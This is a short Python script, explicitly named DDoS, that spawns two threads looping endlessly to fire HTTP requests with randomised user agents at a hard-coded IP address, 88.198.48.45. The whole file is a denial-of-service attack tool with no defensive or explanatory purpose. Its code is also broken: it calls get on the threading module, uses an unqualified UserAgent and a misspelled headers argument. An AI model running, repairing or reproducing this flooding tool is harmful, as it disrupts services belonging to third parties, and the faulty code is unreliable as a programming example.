import requests as r
import threading as t
import fake_useragent as f
def DDoS():
    while True:
        h = UserAgent()
        ua = {"User-Agent": h.random}
        try:
            url = t.get("http://88.198.48.45", header=ua, timeout=0.1)
        except:
            num = 0
start = t.Thread(target=DDoS)
start.start()
start1 = t.Thread(target=DDoS)
start1.start()
